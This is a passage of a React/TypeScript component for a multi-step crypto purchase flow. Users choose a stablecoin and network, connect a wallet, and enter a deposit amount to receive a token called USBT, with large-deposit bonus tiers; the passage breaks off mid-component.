'use client';
import { useState, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  ArrowDown, ArrowSquareOut, CheckCircle, Warning, X, Gift,
  ShieldCheck, CaretLeft, CaretRight, Wallet,
} from '@phosphor-icons/react';
import Button from '../ui/Button';
import WalletModal from '../ui/WalletModal';
import { useWallet } from '../../hooks/useWallet';
import { useToast } from '../../hooks/useToast';
import {
  CONTRACTS, MASTER_TRON_ADDRESS, MASTER_EVM_ADDRESS, EVM_CHAINS,
  DECIMALS_FACTOR, FEE_LIMIT_SUN, TRONSCAN_TX_URL, IS_TESTNET,
} from '../../constants/contracts';
import {
  buildTriggerSmartContract, broadcastTransaction, callContractConstant,
  abiEncodeUint256, abiEncodeAddress,
} from '../../lib/tronGrid';
import { supabase } from '../../lib/supabase';
import { useAuth } from '../../hooks/useAuth';

type TxStep = 'idle' | 'approving' | 'buying' | 'success' | 'error';
type FlowStep = 0 | 1 | 2;

/** Convert a human-readable amount to token units without float precision loss */
function toTokenUnits(amount: number, decimals: number): bigint {
  const [intPart, fracPart = ''] = String(amount).split('.');
  const frac = fracPart.padEnd(decimals, '0').slice(0, decimals);
  return BigInt(intPart + frac);
}

const STEP_LABELS = ['Coin & Network', 'Connect Wallet', 'Enter Amount'];

// ─── Data ─────────────────────────────────────────────────────────────────────

const COINS = [
  {
    id: 'usdt', label: 'USDT', sublabel: 'Tether USD',
    logo: '/usdt-logo.png',
    networks: ['tron', 'ethereum', 'bsc', 'polygon', 'arbitrum'],
  },
  {
    id: 'usdc', label: 'USDC', sublabel: 'USD Coin',
    color: '#2775CA',
    networks: ['ethereum', 'bsc', 'polygon', 'arbitrum', 'avalanche'],
  },
  {
    id: 'busd', label: 'BUSD', sublabel: 'Binance USD',
    color: '#F3BA2F',
    networks: ['bsc', 'ethereum'],
  },
  {
    id: 'dai', label: 'DAI', sublabel: 'Dai Stablecoin',
    color: '#F5AC37',
    networks: ['ethereum', 'polygon', 'arbitrum'],
  },
] as const;

type CoinId = (typeof COINS)[number]['id'];

const NETWORKS: Record<string, {
  label: string; badge: string; abbr: string; color: string; type: 'tron' | 'evm';
}> = {
  tron:      { label: 'TRON',      badge: 'TRC-20', abbr: 'TRX',  color: '#EF4444', type: 'tron' },
  ethereum:  { label: 'Ethereum',  badge: 'ERC-20', abbr: 'ETH',  color: '#627EEA', type: 'evm'  },
  bsc:       { label: 'BNB Chain', badge: 'BEP-20', abbr: 'BNB',  color: '#F3BA2F', type: 'evm'  },
  polygon:   { label: 'Polygon',   badge: 'ERC-20', abbr: 'MATIC',color: '#8247E5', type: 'evm'  },
  arbitrum:  { label: 'Arbitrum',  badge: 'ERC-20', abbr: 'ARB',  color: '#28A0F0', type: 'evm'  },
  avalanche: { label: 'Avalanche', badge: 'ERC-20', abbr: 'AVAX', color: '#E84142', type: 'evm'  },
};

// ─── Bonus Tiers ──────────────────────────────────────────────────────────────

const BONUS_TIERS = [
  {
    id: 'starter',
    label: 'Starter Boost',
    minUsdt: 20_000,
    bonusPct: 10,
    accent: 'text-cyan-400',
    badgeBg: 'bg-cyan-500/15',
    badgeText: 'text-cyan-300',
    borderColor: 'rgba(6,182,212,0.28)',
    bgColor: 'rgba(6,182,212,0.07)',
    popular: false,
  },
  {
    id: 'growth',
    label: 'Growth Pack',
    minUsdt: 50_000,
    bonusPct: 15,
    accent: 'text-violet-400',
    badgeBg: 'bg-violet-500/15',
    badgeText: 'text-violet-300',
    borderColor: 'rgba(139,92,246,0.30)',
    bgColor: 'rgba(139,92,246,0.07)',
    popular: true,
  },
  {
    id: 'elite',
    label: 'Elite Tier',
    minUsdt: 100_000,
    bonusPct: 20,
    accent: 'text-amber-400',
    badgeBg: 'bg-amber-500/15',
    badgeText: 'text-amber-300',
    borderColor: 'rgba(245,158,11,0.30)',
    bgColor: 'rgba(245,158,11,0.07)',
    popular: false,
  },
] as const;

// ─── Step Progress Bar (clickable) ────────────────────────────────────────────

function StepBar({
  current,
  maxReached,
  onStepClick,
}: {
  current: FlowStep;
  maxReached: FlowStep;
  onStepClick: (step: FlowStep) => void;
}) {
  return (
    <div className="flex items-start mb-6">
      {STEP_LABELS.map((label, i) => {
        const isCompleted = i < current;
        const isActive = i === current;
        const isReachable = i <= maxReached;

        return (
          <div key={i} className="flex items-start flex-1 last:flex-none">
            <div className="flex flex-col items-center">
              <button
                onClick={() => isReachable && onStepClick(i as FlowStep)}
                disabled={!isReachable}
                className={`
                  w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold
                  transition-all duration-300 flex-shrink-0
                  ${isCompleted
                    ? 'bg-cyan-500 text-white shadow-[0_0_10px_rgba(6,182,212,0.4)] hover:bg-cyan-400 cursor-pointer'
                    : isActive
                    ? 'border-2 border-cyan-400 text-cyan-400 cursor-default'
                    : 'border border-white/[0.10] text-slate-600 cursor-not-allowed'
                  }
                `}
                style={!isCompleted && !isActive ? { background: 'rgba(255,255,255,0.03)' } : {}}
                aria-label={`Go to step ${i + 1}: ${label}`}
              >
                {isCompleted ? <CheckCircle size={14} weight="fill" /> : <span>{i + 1}</span>}
              </button>
              <span
                className={`
                  text-[9px] font-semibold mt-1.5 whitespace-nowrap tracking-wide
                  ${isActive ? 'text-cyan-400' : isCompleted ? 'text-slate-400' : 'text-slate-700'}
                `}
              >
                {label}
              </span>
            </div>
            {i < STEP_LABELS.length - 1 && (
              <div
                className="flex-1 h-px mx-2 mt-3.5 transition-all duration-500"
                style={{ background: isCompleted ? 'rgba(6,182,212,0.5)' : 'rgba(255,255,255,0.06)' }}
              />
            )}
          </div>
        );
      })}
    </div>
  );
}

// ─── Step 0: Coin & Network (combined) ───────────────────────────────────────

function CoinNetworkStep({
  selectedCoin,
  selectedNetwork,
  onCoinSelect,
  onNetworkSelect,
  onContinue,
}: {
  selectedCoin: CoinId | null;
  selectedNetwork: string | null;
  onCoinSelect: (id: CoinId) => void;
  onNetworkSelect: (id: string) => void;
  onContinue: () => void;
}) {
  const coin = COINS.find(c => c.id === selectedCoin);
  const availableNetworks = coin ? coin.networks : [];
  const canContinue = !!selectedCoin && !!selectedNetwork;

  return (
    <div>
      {/* Coin selection */}
      <div className="mb-6">
        <p className="text-xs font-semibold text-slate-400 uppercase tracking-[0.16em] mb-3">
          Select Coin
        </p>
        <div className="flex flex-wrap gap-2">
          {COINS.map((c) => {
            const isSelected = selectedCoin === c.id;
            return (
              <button
                key={c.id}
                onClick={() => {
                  onCoinSelect(c.id);
                  // Clear network if it's not supported by new coin
                  if (selectedNetwork && !(c.networks as readonly string[]).includes(selectedNetwork)) {
                    onNetworkSelect('');
                  }
                }}
                className="flex items-center gap-2 px-3.5 py-2.5 rounded-xl border
                  transition-all duration-200 active:scale-[0.97] cursor-pointer"
                style={{
                  border: isSelected
                    ? '1px solid rgba(6,182,212,0.55)'
                    : '1px solid rgba(255,255,255,0.08)',
                  background: isSelected
                    ? 'rgba(6,182,212,0.10)'
                    : 'rgba(255,255,255,0.03)',
                  boxShadow: isSelected ? '0 0 16px rgba(6,182,212,0.18)' : undefined,
                }}
              >
                <div className="w-5 h-5 rounded-full flex-shrink-0 overflow-hidden">
                  {'logo' in c && c.logo ? (
                    <img src={c.logo} alt={c.label} className="w-full h-full object-cover" />
                  ) : (
                    <div
                      className="w-full h-full rounded-full flex items-center justify-center text-[8px] font-black text-white"
                      style={{ background: 'color' in c ? c.color : '#888' }}
                    >
                      {c.label[0]}
                    </div>
                  )}
                </div>
                <span className="text-sm font-bold text-white">{c.label}</span>
                {isSelected && (
                  <CheckCircle size={13} weight="fill" className="text-cyan-400 ml-0.5" />
                )}
              </button>
            );
          })}
        </div>
      </div>

      {/* Network selection — reveals when coin is picked */}
      <AnimatePresence>
        {selectedCoin && (
          <motion.div
            key="networks"
            initial={{ opacity: 0, y: -8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            transition={{ type: 'spring', stiffness: 320, damping: 30 }}
          >
            <p className="text-xs font-semibold text-slate-400 uppercase tracking-[0.16em] mb-3">
              Select Network
            </p>
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 mb-2">
              {availableNetworks.map((netId) => {
                const net = NETWORKS[netId];
                if (!net) return null;
                const isSelected = selectedNetwork === netId;
                return (
                  <button
                    key={netId}
                    onClick={() => onNetworkSelect(netId)}
                    className="flex items-center gap-2.5 p-3 rounded-xl border text-left
                      transition-all duration-200 active:scale-[0.97] cursor-pointer"
                    style={{
                      border: isSelected
                        ? `1px solid ${net.color}55`
                        : '1px solid rgba(255,255,255,0.07)',
                      background: isSelected
                        ? `${net.color}12`
                        : 'rgba(255,255,255,0.025)',
                      boxShadow: isSelected ? `0 0 14px ${net.color}22` : undefined,
                    }}
                  >
                    {/* Network badge */}
                    <div
                      className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 text-[8px] font-black"
                      style={{ background: `${net.color}18`, color: net.color }}
                    >
                      {net.abbr.slice(0, 3)}
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className="text-xs font-bold text-white leading-tight truncate">
                        {net.label}
                      </p>
                      <p className="text-[10px] leading-tight" style={{ color: `${net.color}aa` }}>
                        {net.badge}
                      </p>
                    </div>
                    {isSelected && (
                      <CheckCircle
                        size={13}
                        weight="fill"
                        className="flex-shrink-0"
                        style={{ color: net.color }}
                      />
                    )}
                  </button>
                );
              })}
            </div>

            {/* Network warning */}
            <div
              className="mt-3 p-3 rounded-xl flex items-start gap-2.5"
              style={{ background: 'rgba(245,158,11,0.06)', border: '1px solid rgba(245,158,11,0.14)' }}
            >
              <Warning size={13} weight="fill" className="text-amber-400 flex-shrink-0 mt-0.5" />
              <p className="text-[11px] leading-relaxed" style={{ color: 'rgba(251,191,36,0.65)' }}>
                Send only on the selected network. Tokens sent on the wrong network may be permanently lost.
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Continue button */}
      <motion.div
        className="mt-5"
        initial={false}
        animate={{ opacity: canContinue ? 1 : 0.4 }}
        transition={{ duration: 0.2 }}
      >
        <Button
          variant="primary"
          size="lg"
          fullWidth
          disabled={!canContinue}
          onClick={onContinue}
        >
          {canContinue
            ? `Continue with ${COINS.find(c => c.id === selectedCoin)?.label} on ${NETWORKS[selectedNetwork!]?.label}`
            : selectedCoin
            ? 'Select a network to continue'
            : 'Select a coin to continue'}
        </Button>
      </motion.div>
    </div>
  );
}

// ─── Step 1: Wallet Connection ────────────────────────────────────────────────

function WalletStep({
  selectedNetwork,
  isConnected,
  isConnecting,
  account,
  connectionType,
  connect,
  shortenAddress,
  onBack,
  onContinue,
  onOpenWalletModal,
}: {
  selectedNetwork: string | null;
  isConnected: boolean;
  isConnecting: boolean;
  account: string | null;
  connectionType: string;
  connect: () => Promise<void>;
  shortenAddress: (a: string) => string;
  onBack: () => void;
  onContinue: () => void;
  onOpenWalletModal: () => void;
}) {
  const net = selectedNetwork ? NETWORKS[selectedNetwork] : null;
  const isTron = net?.type === 'tron';
  const tronLinkInstalled = typeof window !== 'undefined' && !!window.tronWeb;

  return (
    <div>
      <button
        onClick={onBack}
        className="flex items-center gap-1.5 text-xs text-slate-500 hover:text-white transition-colors mb-5"
      >
        <CaretLeft size={11} /> Back
      </button>

      {/* Network badge */}
      {net && (
        <div className="flex items-center gap-2 mb-4">
          <div
            className="flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs font-bold"
            style={{
              background: `${net.color}12`,
              border: `1px solid ${net.color}30`,
              color: net.color,
            }}
          >
            <div
              className="w-2 h-2 rounded-full flex-shrink-0"
              style={{ background: net.color, boxShadow: `0 0 6px ${net.color}` }}
            />
            {net.label} · {net.badge}
          </div>
        </div>
      )}

      <div className="mb-5">
        <h3 className="text-base font-bold text-white mb-1">Connect your wallet</h3>
        <p className="text-xs text-slate-500">
          {net
            ? `Choose a wallet compatible with ${net.label}.`
            : 'Choose a wallet to connect.'}
        </p>
      </div>

      {isConnected && account ? (
        /* ── Connected ── */
        <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="space-y-3">
          <div
            className="p-4 rounded-xl flex items-center gap-3"
            style={{ background: 'rgba(6,182,212,0.07)', border: '1px solid rgba(6,182,212,0.22)' }}
          >
            <div
              className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
              style={{ background: 'rgba(6,182,212,0.15)' }}
            >
              <Wallet size={17} weight="fill" className="text-cyan-400" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2 mb-0.5">
                <span className="text-xs font-semibold text-cyan-400">Wallet connected</span>
                <span
                  className="text-[9px] font-bold uppercase tracking-[0.12em] px-2 py-0.5 rounded-full"
                  style={{ background: 'rgba(6,182,212,0.12)', color: 'rgba(103,232,249,1)' }}
                >
                  {connectionType === 'walletconnect' ? 'WalletConnect' : 'TronLink'}
                </span>
              </div>
              <p className="text-sm font-mono text-white">{shortenAddress(account)}</p>
            </div>
            <div
              className="w-2 h-2 rounded-full bg-emerald-400 flex-shrink-0"
              style={{ boxShadow: '0 0 6px rgba(52,211,153,0.7)' }}
            />
          </div>

          {net && (
            <div
              className="p-3 rounded-xl flex items-center gap-3"
              style={{ background: 'rgba(255,255,255,0.025)', border: '1px solid rgba(255,255,255,0.06)' }}
            >
              <div
                className="w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 text-[8px] font-black"
                style={{ background: `${net.color}18`, color: net.color }}
              >
                {net.abbr.slice(0, 3)}
              </div>
              <p className="text-xs text-slate-300 flex-1">
                {net.label} · {net.badge}
              </p>
              <ShieldCheck size={14} weight="fill" className="text-emerald-400" />
            </div>
          )}

          <Button variant="primary" size="lg" fullWidth onClick={onContinue}>
            Continue to Amount
          </Button>
        </motion.div>
      ) : (
        /* ── Disconnected ── */
        <div className="space-y-2.5">
          {/* TronLink — TRON only */}
          {(isTron || !selectedNetwork) && (
            <WalletConnectRow
              icon={
                <svg width="22" height="22" viewBox="0 0 40 40" fill="none">
                  <rect width="40" height="40" rx="10" fill="#1a1a2e"/>
                  <path d="M20 7L34 28H6L20 7Z" fill="#ef0027" fillOpacity="0.9"/>
                  <path d="M20 7L34 28H20V7Z" fill="#ef0027"/>
                  <circle cx="20" cy="26" r="5" fill="#ff4d4d" fillOpacity="0.3"/>
                  <circle cx="20" cy="26" r="3" fill="#ff6b6b"/>
                </svg>
              }
              label="TronLink"
              sublabel={tronLinkInstalled ? 'Browser extension · Recommended for TRON' : 'Not installed — opens tronlink.org'}
              badge={tronLinkInstalled ? 'INSTALLED' : undefined}
              badgeColor={tronLinkInstalled ? '#22c55e' : undefined}
              loading={isConnecting}
              onClick={connect}
            />
          )}

          {/* WalletConnect — opens wallet selection modal with 300+ wallets */}
          <WalletConnectRow
            icon={
              <svg width="22" height="22" viewBox="0 0 40 40" fill="none">
                <rect width="40" height="40" rx="10" fill="#3b99fc" fillOpacity="0.15"/>
                <path d="M9.2 16.4c5.96-5.83 15.63-5.83 21.6 0l.71.7a.73.73 0 010 1.04l-2.44 2.38a.38.38 0 01-.53 0l-.98-.96c-4.16-4.07-10.91-4.07-15.07 0l-1.05 1.02a.38.38 0 01-.53 0l-2.44-2.38a.73.73 0 010-1.04l.73-.76zm26.7 4.97l2.17 2.12a.73.73 0 010 1.04l-9.77 9.55a.77.77 0 01-1.06 0l-6.93-6.77a.19.19 0 00-.27 0l-6.93 6.77a.77.77 0 01-1.06 0L2.27 24.53a.73.73 0 010-1.04l2.17-2.12a.77.77 0 011.06 0l6.93 6.77c.07.07.2.07.27 0l6.93-6.77a.77.77 0 011.06 0l6.93 6.77c.07.07.2.07.27 0l6.93-6.77a.77.77 0 011.06 0z" fill="#3b99fc"/>
              </svg>
            }
            label="WalletConnect"
            sublabel={isTron ? 'MetaMask, Trust, Binance, OKX & 300+ wallets' : 'MetaMask, Coinbase, Trust & 300+ wallets'}
            badge="300+ WALLETS"
            badgeColor="#3b99fc"
            loading={isConnecting}
            onClick={onOpenWalletModal}
          />

          <p className="text-[11px] text-slate-700 text-center pt-1">
            Your wallet connects securely. No keys are ever shared.
          </p>
        </div>
      )}
    </div>
  );
}

function WalletConnectRow({
  icon, label, sublabel, badge, badgeColor, loading, onClick,
}: {
  icon: React.ReactNode;
  label: string;
  sublabel: string;
  badge?: string;
  badgeColor?: string;
  loading: boolean;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      disabled={loading}
      className="w-full flex items-center gap-3.5 px-4 py-3.5 rounded-2xl border text-left group
        transition-all duration-200 active:scale-[0.99] disabled:opacity-60 disabled:cursor-wait
        hover:border-white/[0.16] hover:bg-white/[0.04]"
      style={{ border: '1px solid rgba(255,255,255,0.08)', background: 'rgba(255,255,255,0.03)' }}
    >
      <span className="w-11 h-11 rounded-[14px] bg-white/[0.06] border border-white/[0.08] flex items-center justify-center flex-shrink-0 overflow-hidden">
        {loading
          ? <span className="w-4 h-4 rounded-full border-[1.5px] border-cyan-500 border-t-transparent animate-spin" />
          : icon}
      </span>
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 mb-0.5 flex-wrap">
          <p className="text-sm font-semibold text-white">{label}</p>
          {badge && badgeColor && (
            <span
              className="text-[9px] font-bold uppercase tracking-[0.12em] px-1.5 py-0.5 rounded"
              style={{ background: `${badgeColor}18`, color: badgeColor, border: `1px solid ${badgeColor}30` }}
            >
              {badge}
            </span>
          )}
        </div>
        <p className="text-xs text-slate-500 leading-tight">{sublabel}</p>
      </div>
      <CaretRight size={13} className="text-slate-600 group-hover:text-slate-300 transition-colors flex-shrink-0" />
    </button>
  );
}

// ─── Step 2: Amount Input ─────────────────────────────────────────────────────

function AmountStep({
  selectedCoin,
  selectedNetwork,
  account,
  usdtAmount,
  setUsdtAmount,
  usbtOut,
  usdtBalance,
  usbtBalance,
  exchangeRate,
  txStep,
  isLoading,
  insufficient,
  canSubmit,
  quoteLoading,
  activeBonus,
  bonusUsbt,
  parsedUsdt,
  onMaxUsdt,
  onBuy,
  onBack,
  onSelectTier,
  shortenAddress,
}: {
  selectedCoin: CoinId | null;
  selectedNetwork: string | null;
  account: string | null;
  usdtAmount: string;
  setUsdtAmount: (v: string) => void;
  usbtOut: number | null;
  usdtBalance: number | null;
  usbtBalance: number | null;
  exchangeRate: number | null;
  txStep: TxStep;
  isLoading: boolean;
  insufficient: boolean;
  canSubmit: boolean;
  quoteLoading: boolean;
  activeBonus: number;
  bonusUsbt: number;
  parsedUsdt: number;
  onMaxUsdt: () => void;
  onBuy: () => void;
  onBack: () => void;
  onSelectTier: (minUsdt: number) => void;
  shortenAddress: (a: string) => string;
}) {
  const net = selectedNetwork ? NETWORKS[selectedNetwork] : null;
  const coin = COINS.find(c => c.id === selectedCoin);

  return (
    <div>
      {/* Header row */}
      <div className="flex items-center justify-between mb-5">
        <button
          onClick={onBack}
          className="flex items-center gap-1.5 text-xs text-slate-500 hover:text-white transition-colors"
        >
          <CaretLeft size={11} /> Back
        </button>
        <div className="flex items-center gap-2">
          {exchangeRate !== null && (
            <span className="text-xs font-mono text-cyan-400">
              1 {coin?.label ?? 'USDT'} = {(exchangeRate / 100_000).toLocaleString()} USBT
            </span>
          )}
          {account && (
            <div
              className="flex items-center gap-1.5 px-2.5 py-1 rounded-full"
              style={{ background: 'rgba(6,182,212,0.08)', border: '1px solid rgba(6,182,212,0.18)' }}
            >
              <div
                className="w-1.5 h-1.5 rounded-full bg-emerald-400"
                style={{ boxShadow: '0 0 4px rgba(52,211,153,0.7)' }}
              />
              <span className="text-[11px] font-mono text-cyan-400">{shortenAddress(account)}</span>
            </div>
          )}
        </div>
      </div>

      {/* Selection summary badges */}
      {(coin || net) && (
        <div className="flex items-center gap-2 mb-4 flex-wrap">
          {coin && (
            <div
              className="flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold text-white"
              style={{ background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)' }}
            >
              {'logo' in coin && coin.logo ? (
                <img src={coin.logo} alt={coin.label} className="w-3.5 h-3.5 rounded-full" />
              ) : (
                <div
                  className="w-3.5 h-3.5 rounded-full"
                  style={{ background: 'color' in coin ? coin.color : '#888' }}
                />
              )}
              {coin.label}
            </div>
          )}
          {net && (
            <div
              className="flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold"
              style={{
                background: `${net.color}12`,
                border: `1px solid ${net.color}30`,
                color: net.color,
              }}
            >
              {net.label} · {net.badge}
            </div>
          )}
        </div>
      )}

      {/* From */}
      <div
        className="rounded-xl p-4"
        style={{
          background: 'rgba(255,255,255,0.03)',
          border: insufficient
            ? '1px solid rgba(239,68,68,0.3)'
            : '1px solid rgba(255,255,255,0.07)',
        }}
      >
        <div className="flex items-center justify-between mb-3">
          <span className="text-xs font-medium text-slate-400">You pay</span>
          <div className="flex items-center gap-2">
            <div
              className="flex items-center gap-1 px-2 py-0.5 rounded-full"
              style={{ background: 'rgba(6,182,212,0.10)', border: '1px solid rgba(6,182,212,0.22)' }}
            >
              <ShieldCheck size={10} weight="fill" className="text-cyan-400" />
              <span className="text-[10px] font-semibold text-cyan-400">Verified</span>
            </div>
            <a
              href={`https://tronscan.org/#/contract/${CONTRACTS.COLLATERAL}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-slate-600 hover:text-slate-300 transition-colors"
            >
              <ArrowSquareOut size={12} />
            </a>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div
            className="flex items-center gap-2 px-3 py-2 rounded-xl flex-shrink-0"
            style={{ background: 'rgba(255,255,255,0.07)', border: '1px solid rgba(255,255,255,0.10)' }}
          >
            {'logo' in (coin ?? {}) && (coin as { logo?: string }).logo ? (
              <img src={(coin as { logo: string }).logo} className="w-5 h-5 rounded-full" alt={coin?.label} />
            ) : (
              <div
                className="w-5 h-5 rounded-full flex items-center justify-center text-[8px] font-black text-white"
                style={{ background: 'color' in (coin ?? {}) ? (coin as { color: string }).color : '#888' }}
              >
                {coin?.label?.[0] ?? '?'}
              </div>
            )}
            <span className="text-sm font-bold text-white">{coin?.label ?? 'USDT'}</span>
          </div>
          <input
            type="number"
            min="0"
            placeholder="0.00"
            value={usdtAmount}
            onChange={e => setUsdtAmount(e.target.value)}
            disabled={isLoading}
            className="flex-1 min-w-0 bg-transparent text-right text-2xl font-bold text-white
              placeholder-slate-700 outline-none border-none"
            style={{ fontFamily: 'Geist Mono, monospace' }}
          />
        </div>

        <div className="flex items-center justify-between mt-3">
          <span className="text-xs text-slate-500">
            Balance&nbsp;
            <span className="font-mono">{usdtBalance !== null ? usdtBalance.toFixed(2) : '--'}</span>
          </span>
          <div className="flex items-center gap-2">
            {insufficient && (
              <span className="text-[10px] text-red-400 flex items-center gap-1">
                <Warning size={10} /> Insufficient
              </span>
            )}
            {usdtBalance !== null && (
              <button
                onClick={onMaxUsdt}
                className="text-[10px] font-bold text-cyan-500 hover:text-cyan-400 transition-colors px-2 py-0.5 rounded"
                style={{ background: 'rgba(6,182,212,0.10)' }}
              >
                MAX
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Arrow */}
      <div className="flex justify-center relative z-10 py-2.5">
        <div
          className="w-9 h-9 rounded-full flex items-center justify-center"
          style={{ background: 'var(--bg-surface)', border: '2px solid rgba(255,255,255,0.10)' }}
        >
          <ArrowDown size={14} weight="bold" className="text-white" />
        </div>
      </div>

      {/* To — USBT */}
      <div
        className="rounded-xl px-4 py-3 mb-4 flex items-center justify-between"
        style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)' }}
      >
        <div className="flex items-center gap-2.5">
          {/* USBT icon */}
          <div
            className="flex items-center gap-2 px-3 py-2 rounded-xl flex-shrink-0"
            style={{ background: 'rgba(255,255,255,0.07)', border: '1px solid rgba(255,255,255,0.10)' }}
          >
            <img src="/usbt-logo.png" alt="USBT" width="20" height="20" className="rounded-full" />
            <span className="text-sm font-bold text-white">USBT</span>
          </div>
          {/* Trustified badge */}
          <div
            className="flex items-center gap-1 px-2 py-0.5 rounded-full"
            style={{ background: 'rgba(6,182,212,0.10)', border: '1px solid rgba(6,182,212,0.22)' }}
          >
            <ShieldCheck size={10} weight="fill" className="text-cyan-400" />
            <span className="text-[10px] font-semibold text-cyan-400">Trustified</span>
          </div>
        </div>
        <div className="text-right" style={{ fontFamily: 'Geist Mono, monospace' }}>
          {quoteLoading ? (
            <span className="skeleton inline-block w-20 h-5 rounded" />
          ) : (
            <span className={`text-lg font-bold ${usbtOut !== null && !isNaN(usbtOut) && usbtOut > 0 ? 'text-cyan-300' : 'text-slate-600'}`}>
              ${usbtOut !== null && !isNaN(usbtOut) && usbtOut > 0 ? usbtOut.toFixed(2) : '0.00'}
            </span>
          )}
          {usbtBalance !== null && usbtOut !== null && !isNaN(usbtOut) && usbtOut > 0 && (
            <p className="text-[10px] text-slate-500 mt-0.5">
              After: <span className="text-cyan-400">${(usbtBalance + usbtOut).toFixed(2)}</span>
            </p>
          )}
        </div>
      </div>

      {/* Bonus Tiers */}
      <div className="mb-4 mt-1">
        <div className="flex items-center gap-1.5 mb-2.5">
          <Gift size={11} className="text-slate-500" />
          <span className="text-[10px] font-semibold uppercase tracking-[0.20em] text-slate-500">Bonus Offers</span>
        </div>
        <div className="grid grid-cols-3 gap-2">
          {BONUS_TIERS.map((tier) => {
            const isActive = parsedUsdt >= tier.minUsdt;
            return (
              <button
                key={tier.id}
                onClick={() => onSelectTier(tier.minUsdt)}
                className="relative flex flex-col items-start p-2.5 rounded-xl text-left transition-all duration-200 active:scale-[0.97] hover:opacity-90"
                style={{
                  background: isActive ? tier.bgColor : 'rgba(255,255,255,0.03)',
                  border: `1px solid ${isActive ? tier.borderColor : 'rgba(255,255,255,0.07)'}`,
                  boxShadow: isActive ? `0 0 12px ${tier.borderColor}` : undefined,
                }}
              >
                {tier.popular && (
                  <span className="absolute -top-2 left-1/2 -translate-x-1/2 text-[8px] font-bold uppercase tracking-[0.1em] bg-violet-500 text-white px-1.5 py-0.5 rounded-full whitespace-nowrap">
                    Popular
                  </span>
                )}
                <span className={`text-base font-black leading-none mb-0.5 ${isActive ? tier.accent : 'text-slate-500'}`}>
                  +{tier.bonusPct}%
                </span>
                <span className={`text-[9px] font-semibold leading-tight ${isActive ? tier.badgeText : 'text-slate-600'}`}>
                  ${tier.minUsdt >= 1_000 ? `${tier.minUsdt / 1_000}k+` : tier.minUsdt}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Details */}
      {parsedUsdt > 0 && usbtOut !== null && (
        <motion.div
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-4 px-1 space-y-1.5"
        >
          <DetailRow
            label="Exchange rate"
            value={exchangeRate !== null ? `1 ${coin?.label ?? 'USDT'} = ${(exchangeRate / 100_000).toLocaleString()} USBT` : '—'}
          />
          <DetailRow
            label="Network fee"
            value={selectedNetwork && NETWORKS[selectedNetwork]?.type === 'evm' ? '~Gas fees' : '~1–5 TRX'}
          />
          <DetailRow
            label="Deposit to"
            value={selectedNetwork && NETWORKS[selectedNetwork]?.type === 'evm'
              ? `${MASTER_EVM_ADDRESS.slice(0, 8)}…${MASTER_EVM_ADDRESS.slice(-6)}`
              : `${MASTER_TRON_ADDRESS.slice(0, 8)}…${MASTER_TRON_ADDRESS.slice(-6)}`}
            link={selectedNetwork && NETWORKS[selectedNetwork]?.type === 'evm'
              ? `${EVM_CHAINS[selectedNetwork]?.explorerTx.replace('/tx/', '/address/')}${MASTER_EVM_ADDRESS}`
              : `https://tronscan.org/#/address/${MASTER_TRON_ADDRESS}`}
          />
        </motion.div>
      )}

      {/* Bonus banner */}
      <AnimatePresence>
        {activeBonus > 0 && bonusUsbt > 0 && (
          <motion.div
            key="bonus"
            initial={{ opacity: 0, y: -6, scale: 0.97 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -6, scale: 0.97 }}
            transition={{ type: 'spring', stiffness: 300, damping: 28 }}
            className={`mb-4 p-3.5 rounded-xl border flex items-start gap-3 ${
              activeBonus === 20 ? 'bg-amber-500/[0.08] border-amber-500/25'
              : activeBonus === 15 ? 'bg-violet-500/[0.08] border-violet-500/25'
              : 'bg-cyan-500/[0.08] border-cyan-500/25'
            }`}
          >
            <Gift
              size={15}
              weight="fill"
              className={`mt-0.5 flex-shrink-0 ${
                activeBonus === 20 ? 'text-amber-400'
                : activeBonus === 15 ? 'text-violet-400'
                : 'text-cyan-400'
              }`}
            />
            <div>
              <p className={`text-xs font-semibold mb-0.5 ${
                activeBonus === 20 ? 'text-amber-300'
                : activeBonus === 15 ? 'text-violet-300'
                : 'text-cyan-300'
              }`}>
                {activeBonus}% Bonus Active
              </p>
              <p className="text-[11px] text-slate-500 leading-relaxed">
                You will receive an extra{' '}
                <span className={`font-bold ${
                  activeBonus === 20 ? 'text-amber-400'
                  : activeBonus === 15 ? 'text-violet-400'
                  : 'text-cyan-400'
                }`}>
                  {bonusUsbt.toLocaleString(undefined, { maximumFractionDigits: 4 })} USBT
                </span>{' '}
                after the transaction completes.
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* TX status */}
      {(txStep === 'approving' || txStep === 'buying') && (
        <div
          className="mb-4 flex items-center gap-2.5 p-3 rounded-xl"
          style={{ background: 'rgba(6,182,212,0.07)', border: '1px solid rgba(6,182,212,0.18)' }}
        >
          <span className="w-4 h-4 rounded-full border-[1.5px] border-cyan-400 border-t-transparent animate-spin flex-shrink-0" />
          <span className="text-sm text-cyan-300">
            {txStep === 'approving' ? `Approving ${coin?.label ?? 'token'}… confirm in wallet` : 'Sending deposit… confirm in wallet'}
          </span>
        </div>
      )}

      {/* CTA */}
      <Button
        variant="primary"
        size="lg"
        fullWidth
